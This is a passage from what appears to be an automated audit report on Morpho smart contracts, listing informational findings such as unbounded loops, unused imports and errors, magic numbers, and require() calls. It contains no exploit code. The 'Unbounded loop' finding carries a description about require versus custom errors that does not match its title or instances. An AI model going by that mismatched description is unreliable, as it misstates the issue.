[2-4](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/UtilsLib.sol#L2-L4)

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

2: pragma solidity 0.8.21;
3:   
4:   import {IOracle} from "../lib/morpho-blue/src/interfaces/IOracle.sol";

9: import {Math} from "../lib/openzeppelin-contracts/contracts/utils/math/Math.sol";
10:   
11:   /// @title ChainlinkOracle

```

[2-4](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L2-L4), [9-11](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L9-L11)

```solidity
File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

2: pragma solidity ^0.8.0;
3:   
4:   /// @dev From

```

[2-4](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L2-L4)

```solidity
File: morpho-blue-oracles/src/interfaces/IERC4626.sol

2: pragma solidity ^0.8.0;
3:   
4:   interface IERC4626 {

```

[2-4](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L2-L4)

```solidity
File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   import {AggregatorV3Interface} from "../interfaces/AggregatorV3Interface.sol";

6: import {ErrorsLib} from "./ErrorsLib.sol";
7:   
8:   /// @title ChainlinkDataFeedLib

```

[2-4](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L2-L4), [6-8](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L6-L8)

```solidity
File: morpho-blue-oracles/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   /// @title ErrorsLib

```

[2-4](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ErrorsLib.sol#L2-L4)

```solidity
File: morpho-blue-oracles/src/libraries/VaultLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   import {IERC4626} from "../interfaces/IERC4626.sol";

4: import {IERC4626} from "../interfaces/IERC4626.sol";
5:   
6:   /// @title VaultLib

```

[2-4](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/VaultLib.sol#L2-L4), [4-6](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/VaultLib.sol#L4-L6)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

2: pragma solidity 0.8.19;
3:   
4:   import {PendingRoot, IUniversalRewardsDistributorStaticTyping} from "./interfaces/IUniversalRewardsDistributor.sol";

10: import {MerkleProof} from "../lib/openzeppelin-contracts/contracts/utils/cryptography/MerkleProof.sol";
11:    
12:    /// @title UniversalRewardsDistributor

```

[2-4](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L2-L4), [10-12](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L10-L12)

```solidity
File: universal-rewards-distributor/src/UrdFactory.sol

2: pragma solidity 0.8.19;
3:   
4:   import {EventsLib} from "./libraries/EventsLib.sol";

6: import {UniversalRewardsDistributor} from "./UniversalRewardsDistributor.sol";
7:   
8:   /// @title Universal Rewards Distributor Factory

```

[2-4](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L2-L4), [6-8](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L6-L8)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

2: pragma solidity >=0.5.0;
3:   
4:   /// @notice The pending root struct for a merkle tree distribution during the timelock.

37: }
38:    
39:    /// @dev This interface is inherited by the UniversalRewardsDistributor so that function signatures are checked by the

44: }
45:    
46:    /// @title IUniversalRewardsDistributor

```

[2-4](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L2-L4), [37-39](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L37-L39), [44-46](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L44-L46)

```solidity
File: universal-rewards-distributor/src/libraries/ErrorsLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   /// @title ErrorsLib

```

[2-4](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/ErrorsLib.sol#L2-L4)

```solidity
File: universal-rewards-distributor/src/libraries/EventsLib.sol

2: pragma solidity ^0.8.0;
3:   
4:   /// @title EventsLib

```

[2-4](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L2-L4)




### Unbounded loop may run out of gas

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Some parts of the codebase use require statements, while others use custom errors. Consider refactoring the code to use the same approach: the following findings represent the minority of require vs error, and they show the first occurance in each file, for brevity.

*Instances (4)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

353:         for (uint256 i; i < newLength; ++i) {

364:         for (uint256 i; i < currLength; ++i) {

400:         for (uint256 i; i < allocations.length; ++i) {

```

[353](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L353), [364](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L364), [400](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L400)

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

66:         for (uint256 i; i < data.length; ++i) {

```

[66](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L66)




### Unused `error` definition

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Note that there may be cases where an error superficially appears to be used, but this is only because there are multiple definitions of the error in different files. In such cases, the error definition should be moved into a separate file. The instances below are the unused definitions.

*Instances (1)*:

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

19:     error BadSignatory();

```

[19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L19)



### Unused import	_(duplicate of [Unnecessary Import of `PendingAddress` in EventsLib Library])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The identifier is imported but never used within the file

*Instances (2)*:

```solidity
File: metamorpho/src/libraries/EventsLib.sol

/// @audit PendingAddress
6: import {PendingAddress} from "./PendingLib.sol";

```

[6](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L6)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

/// @audit WAD_INT
8: import {MathLib, WAD_INT as WAD} from "./libraries/MathLib.sol";

```

[8](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L8)



### `Constant`s should be defined rather than using magic numbers	_(duplicate of [`constant` should be defined rather than using magic numbers])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39)can benefit from using readable constants instead of hex/numeric literals

*Instances (5)*:


```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit 10
679:         return assets.mulDiv(newTotalSupply + 10 ** _decimalsOffset(), newTotalAssets + 1, rounding);

/// @audit 10
690:         return shares.mulDiv(newTotalAssets + 1, newTotalSupply + 10 ** _decimalsOffset(), rounding);

```

[679](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L679), [690](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L690)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

/// @audit 4
164:             }

```

[164](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L164)

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

/// @audit 10
106:         SCALE_FACTOR = 10

/// @audit 36
108:                 36 + quoteTokenDecimals + quoteFeed1.getDecimals() + quoteFeed2.getDecimals() - baseTokenDecimals

```

[106](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L106), [108](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L108)



### Custom errors should be used rather than `revert()`/`require()`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Custom errors are available from solidity version 0.8.4. Custom errors are more easily processed in `try-catch` blocks, and are easier to re-use and maintain.

*Instances (74)*:


```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

32:         require(_initiator != UNSET_INITIATOR, ErrorsLib.UNINITIATED);

33:         require(_isSenderAuthorized(), ErrorsLib.UNAUTHORIZED_SENDER);

52:         require(_initiator == UNSET_INITIATOR, ErrorsLib.ALREADY_INITIATED);

78:         require(length > 0, ErrorsLib.CALL_FAILED);

```

[32](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L32), [33](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L33), [52](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L52), [78](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L78)

```solidity
File: morpho-blue-bundlers/src/ERC4626Bundler.sol

33:         require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);

38:         require(shares != 0, ErrorsLib.ZERO_SHARES);

43:         require(assets <= maxAssets, ErrorsLib.SLIPPAGE_EXCEEDED);

58:         require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);

66:         require(assets != 0, ErrorsLib.ZERO_AMOUNT);

71:         require(shares >= minShares, ErrorsLib.SLIPPAGE_EXCEEDED);

90:         require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);

91:         require(owner == address(this) || owner == initiator(), ErrorsLib.UNEXPECTED_OWNER);

95:         require(assets != 0, ErrorsLib.ZERO_AMOUNT);

98:         require(shares <= maxShares, ErrorsLib.SLIPPAGE_EXCEEDED);

116:         require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);

117:         require(owner == address(this) || owner == initiator(), ErrorsLib.UNEXPECTED_OWNER);

121:         require(shares != 0, ErrorsLib.ZERO_SHARES);

124:         require(assets >= minAssets, ErrorsLib.SLIPPAGE_EXCEEDED);

```

[33](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L33), [38](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L38), [43](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L43), [58](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L58), [66](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L66), [71](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L71), [90](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L90), [91](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L91), [95](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L95), [98](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L98), [116](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L116), [117](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L117), [121](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L121), [124](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L124)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

27:         require(morpho != address(0), ErrorsLib.ZERO_ADDRESS);

99:         require(onBehalf != address(this), ErrorsLib.BUNDLER_ADDRESS);

109:         if (assets > 0) require(suppliedShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

110:         else require(suppliedAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

127:         require(onBehalf != address(this), ErrorsLib.BUNDLER_ADDRESS);

159:         if (assets > 0) require(borrowedShares <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

160:         else require(borrowedAssets >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

183:         require(onBehalf != address(this), ErrorsLib.BUNDLER_ADDRESS);

193:         if (assets > 0) require(repaidShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

194:         else require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

218:         if (assets > 0) require(withdrawnShares <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

219:         else require(withdrawnAssets >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

256:         require(repaidAssets <= maxRepaidAssets, ErrorsLib.SLIPPAGE_EXCEEDED);

273:         require(msg.sender == address(MORPHO), ErrorsLib.UNAUTHORIZED_SENDER);

```

[27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L27), [99](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L99), [109](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L109), [110](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L110), [127](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L127), [159](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L159), [160](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L160), [183](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L183), [193](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L193), [194](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L194), [218](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L218), [219](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L219), [256](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L256), [273](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L273)

```solidity
File: morpho-blue-bundlers/src/Permit2Bundler.sol

47:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[47](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L47)

```solidity
File: morpho-blue-bundlers/src/StEthBundler.sol

50:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

53:         require(shares >= minShares, ErrorsLib.SLIPPAGE_EXCEEDED);

63:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

75:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[50](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L50), [53](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L53), [63](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L63), [75](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L75)

```solidity
File: morpho-blue-bundlers/src/TransferBundler.sol

27:         require(recipient != address(0), ErrorsLib.ZERO_ADDRESS);

28:         require(recipient != address(this), ErrorsLib.BUNDLER_ADDRESS);

44:         require(recipient != address(0), ErrorsLib.ZERO_ADDRESS);

45:         require(recipient != address(this), ErrorsLib.BUNDLER_ADDRESS);

63:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L27), [28](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L28), [44](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L44), [45](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L45), [63](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L63)

```solidity
File: morpho-blue-bundlers/src/UrdBundler.sol

32:         require(account != address(0), ErrorsLib.ZERO_ADDRESS);

33:         require(account != address(this), ErrorsLib.BUNDLER_ADDRESS);

```

[32](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/UrdBundler.sol#L32), [33](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/UrdBundler.sol#L33)

```solidity
File: morpho-blue-bundlers/src/WNativeBundler.sol

30:         require(wNative != address(0), ErrorsLib.ZERO_ADDRESS);

50:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

62:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[30](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L30), [50](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L50), [62](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L62)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

30:         require(aaveV2Pool != address(0), ErrorsLib.ZERO_ADDRESS);

45:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[30](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L30), [45](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L45)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV3MigrationBundler.sol

27:         require(aaveV3Pool != address(0), ErrorsLib.ZERO_ADDRESS);

42:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L27), [42](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L42)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol

30:         require(cEth != address(0), ErrorsLib.ZERO_ADDRESS);

45:             require(amount != 0, ErrorsLib.ZERO_AMOUNT);

53:             require(amount != 0, ErrorsLib.ZERO_AMOUNT);

70:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[30](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L30), [45](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L45), [53](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L53), [70](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L70)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol

35:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

58:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[35](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L35), [58](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L58)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

74:         require(morpho != address(0), ErrorsLib.ZERO_ADDRESS);

75:         require(curveSteepness >= WAD, ErrorsLib.INPUT_TOO_SMALL);

76:         require(curveSteepness <= ConstantsLib.MAX_CURVE_STEEPNESS, ErrorsLib.INPUT_TOO_LARGE);

77:         require(adjustmentSpeed >= 0, ErrorsLib.INPUT_TOO_SMALL);

78:         require(adjustmentSpeed <= ConstantsLib.MAX_ADJUSTMENT_SPEED, ErrorsLib.INPUT_TOO_LARGE);

79:         require(targetUtilization < WAD, ErrorsLib.INPUT_TOO_LARGE);

80:         require(targetUtilization > 0, ErrorsLib.ZERO_INPUT);

81:         require(initialRateAtTarget >= ConstantsLib.MIN_RATE_AT_TARGET, ErrorsLib.INPUT_TOO_SMALL);

82:         require(initialRateAtTarget <= ConstantsLib.MAX_RATE_AT_TARGET, ErrorsLib.INPUT_TOO_LARGE);

101:         require(msg.sender == MORPHO, ErrorsLib.NOT_MORPHO);

```

[74](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L74), [75](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L75), [76](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L76), [77](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L77), [78](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L78), [79](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L79), [80](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L80), [81](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L81), [82](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L82), [101](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L101)

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

69:         require(
70:                address(vault) != address(0) || vaultConversionSample == 1, ErrorsLib.VAULT_CONVERSION_SAMPLE_IS_NOT_ONE
71:            );

72:         require(vaultConversionSample != 0, ErrorsLib.VAULT_CONVERSION_SAMPLE_IS_ZERO);

```

[69-71](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L69-L71), [72](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L72)

```solidity
File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol

24:         require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

```

[24](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L24)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

50:         require(msg.sender == owner, ErrorsLib.NOT_OWNER);

56:         require(isUpdater[msg.sender] || msg.sender == owner, ErrorsLib.NOT_UPDATER_ROLE);

81:         require(newRoot != pendingRoot.root || newIpfsHash != pendingRoot.ipfsHash, ErrorsLib.ALREADY_PENDING);

92:         require(pendingRoot.validAt != 0, ErrorsLib.NO_PENDING_ROOT);

93:         require(block.timestamp >= pendingRoot.validAt, ErrorsLib.TIMELOCK_NOT_EXPIRED);

101:         require(pendingRoot.validAt != 0, ErrorsLib.NO_PENDING_ROOT);

119:         require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);

120:         require(
121:                 MerkleProof.verifyCalldata(
122:                     proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
123:                 ),
124:                 ErrorsLib.INVALID_PROOF_OR_EXPIRED
125:             );

127:         require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

144:         require(newRoot != root || newIpfsHash != ipfsHash, ErrorsLib.ALREADY_SET);

145:         require(timelock == 0 || msg.sender == owner, ErrorsLib.UNAUTHORIZED_ROOT_CHANGE);

155:         require(newTimelock != timelock, ErrorsLib.ALREADY_SET);

164:         require(isUpdater[updater] != active, ErrorsLib.ALREADY_SET);

173:         require(newOwner != owner, ErrorsLib.ALREADY_SET);

```

[50](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L50), [56](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L56), [81](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L81), [92](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L92), [93](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L93), [101](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L101), [119](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L119), [120-125](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L120-L125), 